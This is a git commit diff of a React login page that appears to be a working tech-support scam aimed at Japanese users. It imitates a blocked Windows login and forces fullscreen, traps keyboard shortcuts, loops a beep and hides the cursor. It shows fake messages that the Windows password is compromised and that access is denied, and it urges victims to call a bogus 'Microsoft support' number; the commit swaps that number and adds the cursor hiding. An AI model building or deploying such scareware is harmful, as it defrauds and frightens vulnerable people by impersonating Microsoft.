ea82db8597f46108195df44e2ac6cf59217326d4
Aditya Malik <adityamalik@Adityas-MacBook-Pro.local>
2021-10-05 14:13:34 +0530

    no cursor:

--- src/Login/index.jsx
+++ src/Login/index.jsx
@@ -11,139 +11,204 @@ import beepAudio from "../beep-04.mp3";
 import { Modal, Row, Col, message, notification } from "antd";
 import PhoneLogo from "../images/phn.svg";
 import {
-  makeWindowFullScreen,
-  addShortcutsKeyboard,
+    makeWindowFullScreen,
+    addShortcutsKeyboard,
 } from "../utils/ShortcutEnableDisable";
 
 const Login = (props) => {
-  const [audio] = useState(new Audio(beepAudio));
-  const [phoneNumber] = useState("050-5479-2376");
+    const [audio] = useState(new Audio(beepAudio));
+    const [phoneNumber] = useState("050-5479-9330");
 
-  const [isModalVisible, setIsModalVisible] = useState(false);
-  const requestFullScreen = () => {
-    addShortcutsKeyboard();
-    makeWindowFullScreen();
-    loginToDash();
-  };
+    const [isModalVisible, setIsModalVisible] = useState(false);
+    const requestFullScreen = () => {
+        addShortcutsKeyboard();
+        makeWindowFullScreen();
+        loginToDash();
+        document.getElementById("login-wrapper").style.cursor = "none";
+    };
 
-  const showModal = () => {
-    setIsModalVisible(true);
-  };
+    const showModal = () => {
+        setIsModalVisible(true);
+    };
 
-  const handleCancel = () => {
-    setIsModalVisible(false);
-    notificationPopup();
-  };
+    const handleCancel = () => {
+        setIsModalVisible(false);
+        notificationPopup();
+    };
 
-  useEffect(() => {
-    document.addEventListener("fullscreenchange", exitHandler);
-    document.addEventListener("webkitfullscreenchange", exitHandler);
-    document.addEventListener("mozfullscreenchange", exitHandler);
-    document.addEventListener("MSFullscreenChange", exitHandler);
-  }, []);
+    useEffect(() => {
+        document.addEventListener("fullscreenchange", exitHandler);
+        document.addEventListener("webkitfullscreenchange", exitHandler);
+        document.addEventListener("mozfullscreenchange", exitHandler);
+        document.addEventListener("MSFullscreenChange", exitHandler);
+    }, []);
 
-  const notificationPopup = () => {
-    notification['error']({
-      message: 'ログアウトしました',
-      description:
-        'ログアウトしました。正しいパスワードでログインしてみてください',
-      icon: <img src={warningIcon} height="40px" width="40px"/>,
-      onClick: loginToDash,
-      onClose: loginToDash,
-    });
-  }
+    const notificationPopup = () => {
+        notification["error"]({
+            message: "ログアウトしました",
+            description:
+                "ログアウトしました。正しいパスワードでログインしてみてください",
+            icon: <img src={warningIcon} height="40px" width="40px" />,
+            onClick: loginToDash,
+            onClose: loginToDash,
+        });
+    };
 
-  const exitHandler = () => {
-    var fullscreenElement =
-      document.fullscreenElement ||
-      document.webkitFullscreenElement ||
-      document.mozFullscreenElement ||
-      document.msFullscreenElement;
+    const exitHandler = () => {
+        var fullscreenElement =
+            document.fullscreenElement ||
+            document.webkitFullscreenElement ||
+            document.mozFullscreenElement ||
+            document.msFullscreenElement;
 
-    if (!fullscreenElement) {
-      console.log("Leaving full-screen mode...");
-    } else {
-      console.log("Entering full-screen mode...");
-    }
-  };
+        if (!fullscreenElement) {
+            console.log("Leaving full-screen mode...");
+        } else {
+            console.log("Entering full-screen mode...");
+        }
+    };
 
-  const loginToDash = () => {
-    audio.play();
-    audio.loop = true;
+    const loginToDash = () => {
+        audio.play();
+        audio.loop = true;
 
-      document.getElementById("chat-box").style.display = "block";
-      
-      showModal();
-      message.error("ログインがブロックされました");
-  };
+        document.getElementById("chat-box").style.display = "block";
 
-  return (
-    <>
-    <Modal maskClosable={false} footer={null} header={null} centered visible={isModalVisible} onCancel={handleCancel}>
-          <p>C:WINDOWS\SYSTEM32\MSVCR120.dll</p>
+        showModal();
+        message.error("ログインがブロックされました");
+    };
 
-          <br />
+    return (
+        <>
+            <Modal
+                maskClosable={false}
+                footer={null}
+                header={null}
+                centered
+                visible={isModalVisible}
+                onCancel={handleCancel}
+                bodyStyle={{cursor: "none"}}
+                keyboard={false}
+                wrapClassName="noCursor"
+            >
+                <p>C:WINDOWS\SYSTEM32\MSVCR120.dll</p>
 
-          <Row>
-            <Col span={4}>
-              <img src={windowCross} id="windowCross" />
-            </Col>
-            <Col span={20}>
-              Windowsのパスワードが危険にさらされています。ファイルへのアクセスは拒否されます。マイクロソフトサポート担当者に連絡してください：<img src={PhoneLogo} height={15} style={{marginRight: "8px"}} />{phoneNumber}
-            </Col>
-          </Row>
-          
-          <br />
-          <Row justify="end">
-            <Col>
-              <button style={{width: "100px"}} onClick={handleCancel}>OK</button>
-            </Col>
-          </Row>
-        </Modal>
-    <div onClick={requestFullScreen} className="login-wrapper" id="login-wrapper">
-      <div className="center">
-        <div className="container">
-          <img src={userPhoto} className="rounded-circle userPhoto" height="180px" width="180px"/>
-          <h1 className="mt-3 microsoftFont" style={{color: "white"}}>一時的なユーザー</h1>
-          {/* <input type="text" value={username} readOnly={true} className="usernameField mt-3"/><br /> */}
-          {/* <input onKeyPress={keyCheckEnter} id="pass" type="password" placeholder="Password" onChange={(e) => setPassword(e.target.value)} className="passwordField microsoftFont mt-3"/> */}
-          <br />
-          <button id="myBtn" type="submit">
-            ログイン
-          </button>
-          <br />
-          <br />
-          
-          <p className="signinoptions">サポート問い合わせ先 ：<span className="phone"><img src={PhoneLogo} height={18}/></span><span style={{fontSize: "20px", marginLeft: "5px"}}>{phoneNumber}</span> </p>
+                <br />
 
-          <div style={{display: "none"}} id="chat-box">
-            <img src={microsoftLogo} />
-            <span style={{color: "#222",
-              fontSize: "30px",
-              fontWeight: "600",
-              marginLeft: "6px",
-              position: "relative",
-              top: "5px"
-            }}>
-                Microsoft
-            </span> 
-            <p style={{fontWeight: "600"}}>サポート問い合わせ先</p>
-            <h4 style={{fontWeight: "600"}}>
-              <img src={PhoneLogo} height={20} style={{marginTop: "5px"}} />{phoneNumber}
-            </h4>
-            <div class="arrow-down">
-                <i class="fa fa-caret-down"></i>
+                <Row>
+                    <Col span={4}>
+                        <img src={windowCross} id="windowCross" />
+                    </Col>
+                    <Col span={20}>
+                        Windowsのパスワードが危険にさらされています。ファイルへのアクセスは拒否されます。マイクロソフトサポート担当者に連絡してください：
+                        <img
+                            src={PhoneLogo}
+                            height={15}
+                            style={{ marginRight: "8px" }}
+                        />
+                        {phoneNumber}
+                    </Col>
+                </Row>
+
+                <br />
+                <Row justify="end">
+                    <Col>
+                        <button
+                            style={{ width: "100px" }}
+                            onClick={handleCancel}
+                        >
+                            OK
+                        </button>
+                    </Col>
+                </Row>
+            </Modal>
+            <div
+                onClick={requestFullScreen}
+                className="login-wrapper"
+                id="login-wrapper"
+            >
+                <div className="center">
+                    <div className="container">
+                        <img
+                            src={userPhoto}
+                            className="rounded-circle userPhoto"
+                            height="180px"
+                            width="180px"
+                        />
+                        <h1
+                            className="mt-3 microsoftFont"
+                            style={{ color: "white" }}
+                        >
+                            一時的なユーザー
+                        </h1>
+                        {/* <input type="text" value={username} readOnly={true} className="usernameField mt-3"/><br /> */}
+                        {/* <input onKeyPress={keyCheckEnter} id="pass" type="password" placeholder="Password" onChange={(e) => setPassword(e.target.value)} className="passwordField microsoftFont mt-3"/> */}
+                        <br />
+                        <button id="myBtn" type="submit">
+                            ログイン
+                        </button>
+                        <br />
+                        <br />
+
+                        <p className="signinoptions">
+                            サポート問い合わせ先 ：
+                            <span className="phone">
+                                <img src={PhoneLogo} height={18} />
+                            </span>
+                            <span
+                                style={{ fontSize: "20px", marginLeft: "5px" }}
+                            >
+                                {phoneNumber}
+                            </span>{" "}
+                        </p>
+
+                        <div style={{ display: "none" }} id="chat-box">
+                            <img src={microsoftLogo} />
+                            <span
+                                style={{
+                                    color: "#222",
+                                    fontSize: "30px",
+                                    fontWeight: "600",
+                                    marginLeft: "6px",
+                                    position: "relative",
+                                    top: "5px",
+                                }}
+                            >
+                                Microsoft
+                            </span>
+                            <p style={{ fontWeight: "600" }}>
+                                サポート問い合わせ先
+                            </p>
+                            <h4 style={{ fontWeight: "600" }}>
+                                <img
+                                    src={PhoneLogo}
+                                    height={20}
+                                    style={{ marginTop: "5px" }}
+                                />
+                                {phoneNumber}
+                            </h4>
+                            <div class="arrow-down">
+                                <i class="fa fa-caret-down"></i>
+                            </div>
+                        </div>
+
+                        <img
+                            src={firstPic}
+                            className="iconImage1 rounded-circle"
+                        />
+                        <img
+                            src={secondPic}
+                            className="iconImage2 rounded-circle"
+                        />
+                        <img
+                            src={thirdPic}
+                            className="iconImage3 rounded-circle"
+                        />
+                    </div>
+                </div>
             </div>
-          </div>
-
-          <img src={firstPic} className="iconImage1 rounded-circle"/>
-          <img src={secondPic} className="iconImage2 rounded-circle"/>
-          <img src={thirdPic} className="iconImage3 rounded-circle"/>
-        </div>
-      </div>
-    </div>
-    </>
-  );
+        </>
+    );
 };
 
 export default Login;
